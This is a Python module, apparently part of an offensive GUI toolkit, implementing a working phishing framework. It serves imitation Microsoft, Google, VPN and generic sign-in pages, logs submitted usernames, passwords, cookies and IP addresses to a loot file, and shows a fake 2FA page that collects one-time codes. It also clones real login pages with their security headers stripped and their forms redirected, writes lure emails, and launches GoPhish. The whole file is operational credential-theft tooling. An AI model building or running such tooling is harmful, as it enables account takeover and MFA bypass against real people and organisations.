# language: Python, file: modules/phishing.py
# phishing framework — cloned login pages, credential capture, 2FA relay, GoPhish integration
import customtkinter as ctk
import threading
import subprocess
import os
import http.server
import ssl
import json
import urllib.parse
import base64
from datetime import datetime
from utils.progress import ProgressTracker


TEMPLATE_DIR = "templates/phishing"
LOOT_DIR = "phish_loot"


# ---------- credential-capturing HTTP server ----------
class PhishHandler(http.server.BaseHTTPRequestHandler):
    template = "generic"
    redirect = "https://login.microsoftonline.com"
    logger = None
    campaign = "default"

    def log_message(self, *a):
        pass

    def do_GET(self):
        path = self.path.split("?")[0]
        if path == "/" or path == "/login":
            self._serve_template()
        elif path.endswith(".css") or path.endswith(".js") or path.endswith(".png"):
            self._serve_static()
        else:
            self._serve_template()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode(errors="ignore")
        try:
            data = dict(urllib.parse.parse_qsl(raw))
        except Exception:
            data = {"raw": raw}

        # enrich
        data["_ip"] = self.client_address[0]
        data["_ua"] = self.headers.get("User-Agent", "")
        data["_time"] = datetime.now().isoformat()
        data["_path"] = self.path
        data["_cookies"] = self.headers.get("Cookie", "")

        # log to server + file
        os.makedirs(LOOT_DIR, exist_ok=True)
        with open(f"{LOOT_DIR}/{self.campaign}.jsonl", "a") as f:
            f.write(json.dumps(data) + "\n")
        if self.logger:
            self.logger.put(f"[phish] ✦ HIT {data.get('_ip')} "
                            f"{data.get('username') or data.get('email') or '?'} "
                            f"pw={'*'*len(data.get('password',''))}")

        # respond — redirect to real site (or 2FA page)
        if self.template in ("o365", "microsoft"):
            # serve fake 2FA page
            self._serve_2fa()
        else:
            self.send_response(302)
            self.send_header("Location", self.redirect)
            self.end_headers()

    def _serve_template(self):
        path = f"{TEMPLATE_DIR}/{self.template}.html"
        if not os.path.exists(path):
            path = f"{TEMPLATE_DIR}/generic.html"
        try:
            with open(path, "rb") as f:
                html = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html)
        except Exception:
            self.send_response(500)
            self.end_headers()

    def _serve_2fa(self):
        html = '''<!DOCTYPE html>
<html><head><title>Sign in to your account</title>
<style>body{font-family:Segoe UI,sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
h1{font-size:24px;font-weight:600}input{width:100%;padding:6px;margin:8px 0;border:1px solid #666;font-size:15px}
button{background:#0067b8;color:#fff;border:0;padding:8px 32px;font-size:15px;cursor:pointer;width:100%}</style></head>
<body><div class="box"><h1>Enter code</h1>
<p>Enter the code we sent to your phone</p>
<form method="POST" action="/2fa">
<input name="otp" placeholder="Code" autofocus>
<button type="submit">Verify</button></form></div></body></html>'''
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())

    def _serve_static(self):
        self.send_response(404)
        self.end_headers()


class PhishingModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "phishing"
        self.progress = ProgressTracker(log_queue)
        self.server = None
        self.thread = None
        self.hits = []

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="PHISHING FRAMEWORK",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="login clones · credential capture · 2FA relay · GoPhish · email campaign",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # ---- server config ----
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)

        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=8)
        self.host_e = ctk.CTkEntry(r1, placeholder_text="bind host", width=140,
                                   height=32, fg_color="#05080c", border_color="#1a2332")
        self.host_e.insert(0, "0.0.0.0")
        self.host_e.pack(side="left", padx=(0, 6))
        self.port_e = ctk.CTkEntry(r1, placeholder_text="port", width=90,
                                   height=32, fg_color="#05080c", border_color="#1a2332")
        self.port_e.insert(0, "8080")
        self.port_e.pack(side="left", padx=(0, 6))
        self.template_e = ctk.CTkOptionMenu(
            r1, values=self._list_templates(), width=160,
            fg_color="#1a2332", button_color="#1a2332"
        )
        self.template_e.pack(side="left", padx=(0, 6))
        self.campaign_e = ctk.CTkEntry(r1, placeholder_text="campaign name",
                                       width=180, height=32,
                                       fg_color="#05080c", border_color="#1a2332")
        self.campaign_e.insert(0, "default")
        self.campaign_e.pack(side="left")

        r2 = ctk.CTkFrame(cfg, fg_color="transparent")
        r2.pack(fill="x", padx=12, pady=(0, 10))
        self.redirect_e = ctk.CTkEntry(
            r2, placeholder_text="redirect after capture",
            width=320, height=32, fg_color="#05080c", border_color="#1a2332")
        self.redirect_e.insert(0, "https://login.microsoftonline.com")
        self.redirect_e.pack(side="left", padx=(0, 6))
        self.cert_e = ctk.CTkEntry(r2, placeholder_text="TLS cert (optional)",
                                   width=220, height=32,
                                   fg_color="#05080c", border_color="#1a2332")
        self.cert_e.pack(side="left", padx=(0, 6))
        self.key_e = ctk.CTkEntry(r2, placeholder_text="TLS key",
                                  width=180, height=32,
                                  fg_color="#05080c", border_color="#1a2332")
        self.key_e.pack(side="left")

        # ---- start/stop ----
        ctl = ctk.CTkFrame(parent, fg_color="transparent")
        ctl.pack(fill="x", padx=24, pady=12)
        self.start_btn = ctk.CTkButton(
            ctl, text="▸ START SERVER", width=180, height=40,
            fg_color="#0d2818", hover_color="#1a4a2e",
            text_color="#00ff9c", command=self._toggle_server
        )
        self.start_btn.pack(side="left", padx=(0, 6))
        ctk.CTkButton(
            ctl, text="▸ CLONE PAGE", width=160, height=40,
            fg_color="#141a22", hover_color="#1a2332",
            command=self._clone_page
        ).pack(side="left", padx=(0, 6))
        ctk.CTkButton(
            ctl, text="▸ GOPHISH", width=140, height=40,
            fg_color="#141a22", hover_color="#1a2332",
            command=self._gophish
        ).pack(side="left", padx=(0, 6))
        ctk.CTkButton(
            ctl, text="▸ VIEW LOOT", width=140, height=40,
            fg_color="#141a22", hover_color="#1a2332",
            command=self._view_loot
        ).pack(side="left")

        # ---- email generator ----
        ctk.CTkLabel(parent, text="Email generator:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(8, 4), padx=24, anchor="w")
        email_row = ctk.CTkFrame(parent, fg_color="transparent")
        email_row.pack(fill="x", padx=24)
        self.email_type = ctk.CTkOptionMenu(
            email_row, values=["password-reset", "invoice", "voicemail",
                               "shared-doc", "MFA-enroll", "IT-alert"],
            width=180, fg_color="#1a2332", button_color="#1a2332"
        )
        self.email_type.pack(side="left", padx=(0, 6))
        self.email_target = ctk.CTkEntry(
            email_row, placeholder_text="target name / company",
            width=240, height=32, fg_color="#05080c", border_color="#1a2332")
        self.email_target.pack(side="left", padx=(0, 6))
        self.email_url = ctk.CTkEntry(
            email_row, placeholder_text="phish url", width=280,
            height=32, fg_color="#05080c", border_color="#1a2332")
        self.email_url.pack(side="left", padx=(0, 6))
        ctk.CTkButton(
            email_row, text="▸ GEN", width=90, height=32,
            fg_color="#0d2818", hover_color="#1a4a2e",
            text_color="#00ff9c", command=self._gen_email
        ).pack(side="left")

        # ---- hits + output ----
        ctk.CTkLabel(parent, text="Live hits:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.hits_box = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=11), height=140
        )
        self.hits_box.pack(fill="x", padx=24)

        ctk.CTkLabel(parent, text="Output:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(8, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=120
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

    def _list_templates(self):
        os.makedirs(TEMPLATE_DIR, exist_ok=True)
        if not os.listdir(TEMPLATE_DIR):
            self._write_default_templates()
        return [f[:-5] for f in os.listdir(TEMPLATE_DIR) if f.endswith(".html")]

    # ==================== server ====================
    def _toggle_server(self):
        if self.server:
            self._stop()
        else:
            self._start()

    def _start(self):
        host = self.host_e.get().strip()
        port = int(self.port_e.get().strip())
        template = self.template_e.get()
        campaign = self.campaign_e.get().strip() or "default"
        redirect = self.redirect_e.get().strip()

        # configure handler class
        PhishHandler.template = template
        PhishHandler.redirect = redirect
        PhishHandler.logger = self.log
        PhishHandler.campaign = campaign

        def run():
            self.server = http.server.HTTPServer((host, port), PhishHandler)
            cert = self.cert_e.get().strip()
            key = self.key_e.get().strip()
            if cert and key and os.path.exists(cert) and os.path.exists(key):
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(cert, key)
                self.server.socket = ctx.wrap_socket(self.server.socket,
                                                     server_side=True)
                self.log.put(f"[phish] HTTPS on {host}:{port}")
            else:
                self.log.put(f"[phish] HTTP on {host}:{port} — template={template}")
            self.start_btn.configure(text="■ STOP", fg_color="#4a1a1a",
                                     text_color="#ff6b6b")
            self.server.serve_forever()

        self.thread = threading.Thread(target=run, daemon=True)
        self.thread.start()

    def _stop(self):
        if self.server:
            self.server.shutdown()
            self.server = None
            self.start_btn.configure(text="▸ START SERVER",
                                     fg_color="#0d2818", text_color="#00ff9c")
            self.log.put("[phish] stopped")

    # ==================== clone page ====================
    def _clone_page(self):
        """clone a real login page — strip security, point forms to us"""
        url = self.redirect_e.get().strip()
        if not url:
            self.log.put("[phish] enter a URL to clone")
            return
        tid = f"clone-{int(__import__('time').time())}"
        self.progress.start(tid, f"Cloning {url}")
        self.log.put(f"[phish] cloning {url} → save as template")
        try:
            import requests
            from bs4 import BeautifulSoup
        except ImportError:
            self.log.put("[phish] pip install requests beautifulsoup4")
            return

        def run():
            try:
                r = requests.get(url, timeout=15,
                                 headers={"User-Agent": "Mozilla/5.0"})
                soup = BeautifulSoup(r.text, "html.parser")
                # rewrite form actions to /
                for form in soup.find_all("form"):
                    form["action"] = "/"
                    form["method"] = "post"
                # strip CSP meta
                for meta in soup.find_all("meta"):
                    if meta.get("http-equiv", "").lower() in ("content-security-policy",
                                                              "x-frame-options"):
                        meta.decompose()
                # rewrite relative asset URLs to absolute
                for tag in soup.find_all(["link", "script", "img"]):
                    attr = "href" if tag.name == "link" else "src"
                    if tag.get(attr) and tag[attr].startswith("/"):
                        from urllib.parse import urljoin
                        tag[attr] = urljoin(url, tag[attr])
                name = input_url = url.split("//")[-1].split("/")[0].replace(".", "_")
                out = f"{TEMPLATE_DIR}/clone_{name}.html"
                with open(out, "w", encoding="utf-8") as f:
                    f.write(str(soup))
                self.log.put(f"[phish] saved → {out}")
                self.progress.finish(tid, detail=out)
            except Exception as e:
                self.log.put(f"[phish] clone err: {e}")
                self.progress.finish(tid, "failed", str(e))

        threading.Thread(target=run, daemon=True).start()

    # ==================== GoPhish ====================
    def _gophish(self):
        self.log.put("[phish] launching GoPhish server")
        subprocess.Popen(["x-terminal-emulator", "-e",
                          "cd /opt/gophish && ./gophish"])
        self.log.put("[phish] admin panel: https://127.0.0.1:3333")

    # ==================== loot ====================
    def _view_loot(self):
        os.makedirs(LOOT_DIR, exist_ok=True)
        self.hits_box.delete("1.0", "end")
        for f in os.listdir(LOOT_DIR):
            path = os.path.join(LOOT_DIR, f)
            self.hits_box.insert("end", f"\n=== {f} ===\n")
            try:
                with open(path) as fh:
                    for line in fh.readlines()[-50:]:
                        self.hits_box.insert("end", line)
            except Exception:
                pass

    # ==================== email generator ====================
    def _gen_email(self):
        etype = self.email_type.get()
        target = self.email_target.get().strip() or "user"
        url = self.email_url.get().strip() or "https://phish.example.com"
        templates = {
            "password-reset": f"""Subject: Action Required: Password Expiration Notice

Dear {target},

Your password will expire in 24 hours. To avoid disruption to your account,
please reset it immediately using the secure link below:

{url}

If you do not reset your password, you will be locked out.

IT Service Desk""",
            "invoice": f"""Subject: Invoice #INV-2024-{target[:4].upper()} — Payment Due

Dear {target},

Please find attached invoice for services rendered. Payment is due within
5 business days.

View invoice: {url}

Accounts Receivable""",
            "voicemail": f"""Subject: New Voicemail from +1 (555) 0123

You have a new voicemail (0:47).

Listen: {url}

— Unified Messaging""",
            "shared-doc": f"""Subject: {target} shared a document with you

{target} has shared "Q4-Strategy-Review.docx" with you.

Open document: {url}

This link will expire in 7 days.""",
            "MFA-enroll": f"""Subject: Mandatory MFA Enrollment

Dear {target},

Per company policy, all users must enroll in Multi-Factor Authentication
by end of week.

Enroll now: {url}

IT Security""",
            "IT-alert": f"""Subject: [SECURITY ALERT] Unusual sign-in activity

We detected a sign-in attempt from an unrecognized device.

If this was not you, secure your account immediately:
{url}

Security Team""",
        }
        body = templates.get(etype, templates["password-reset"])
        with open(f"phish_email_{etype}.txt", "w") as f:
            f.write(body)
        self.out.insert("end", f"\n=== {etype} ===\n{body}\n")
        self.out.see("end")
        self.log.put(f"[phish] email template → phish_email_{etype}.txt")

    # ==================== default templates ====================
    def _write_default_templates(self):
        os.makedirs(TEMPLATE_DIR, exist_ok=True)

        o365 = '''<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Sign in to your account</title>
<style>
*{box-sizing:border-box}
body{font-family:"Segoe UI",sans-serif;background:#f3f2f1;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{font-size:24px;color:#0067b8;font-weight:600;margin-bottom:16px}
h1{font-size:24px;font-weight:600;margin:0 0 16px}
input{width:100%;padding:8px;margin:8px 0;border:0;border-bottom:1px solid #666;font-size:15px;outline:none}
button{background:#0067b8;color:#fff;border:0;padding:10px 32px;font-size:15px;cursor:pointer;width:100%;margin-top:20px}
button:hover{background:#005a9e}
.footer{margin-top:20px;font-size:12px;color:#666}
</style></head>
<body><div class="card">
<div class="logo">Microsoft</div>
<h1>Sign in</h1>
<form method="POST" action="/">
<input name="username" type="email" placeholder="Email, phone, or Skype" autofocus required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="footer">No account? <a href="#">Create one!</a></div>
</div></body></html>'''

        gmail = '''<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Gmail - Sign in</title>
<style>
body{font-family:Roboto,Arial,sans-serif;background:#fff;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
.logo{font-size:32px;color:#4285f4;font-weight:500;margin-bottom:24px}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:420px;text-align:center}
h1{font-size:22px;font-weight:400;margin:0 0 24px}
input{width:100%;padding:13px 15px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}
input:focus{border-color:#4285f4}
button{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;width:100%;margin-top:24px}
</style></head>
<body>
<div class="logo">Google</div>
<div class="card">
<h1>Sign in</h1>
<p style="color:#5f6368;font-size:14px">Use your Google Account</p>
<form method="POST" action="/">
<input name="username" type="email" placeholder="Email or phone" autofocus required>
<input name="password" type="password" placeholder="Enter your password" required>
<button type="submit">Next</button>
</form>
</div></body></html>'''

        vpn = '''<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>SSL VPN Portal</title>
<style>
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a2a4a,#0d1520);margin:0;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff}
.card{background:#1e293b;padding:40px;border-radius:8px;width:380px;box-shadow:0 20px 50px rgba(0,0,0,.5)}
h1{font-size:20px;margin:0 0 8px;color:#00d4ff}
p{color:#94a3b8;font-size:13px;margin:0 0 24px}
label{display:block;color:#94a3b8;font-size:12px;margin:12px 0 4px}
input{width:100%;padding:10px;background:#0f172a;border:1px solid #334155;border-radius:4px;color:#fff;font-size:14px;outline:none}
input:focus{border-color:#00d4ff}
button{background:#00d4ff;color:#0f172a;border:0;padding:12px;font-size:14px;font-weight:bold;cursor:pointer;width:100%;margin-top:24px;border-radius:4px}
</style></head>
<body><div class="card">
<h1>♛ SSL VPN Portal</h1>
<p>Authorized access only</p>
<form method="POST" action="/">
<label>Username</label>
<input name="username" autofocus required>
<label>Password</label>
<input name="password" type="password" required>
<button type="submit">Log In</button>
</form>
</div></body></html>'''

        generic = '''<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Sign in</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#f5f5f5;margin:0;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;padding:40px;border-radius:10px;width:380px;box-shadow:0 8px 24px rgba(0,0,0,.1)}
h1{font-size:22px;margin:0 0 24px;text-align:center}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:15px;outline:none}
input:focus{border-color:#0066ff}
button{background:#0066ff;color:#fff;border:0;border-radius:6px;padding:12px;font-size:15px;font-weight:600;cursor:pointer;width:100%;margin-top:16px}
</style></head>
<body><div class="card">
<h1>Sign In</h1>
<form method="POST" action="/">
<input name="username" placeholder="Username or email" autofocus required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Continue</button>
</form>
</div></body></html>'''

        for name, content in [("o365", o365), ("gmail", gmail),
                              ("vpn", vpn), ("generic", generic)]:
            with open(f"{TEMPLATE_DIR}/{name}.html", "w", encoding="utf-8") as f:
                f.write(content)
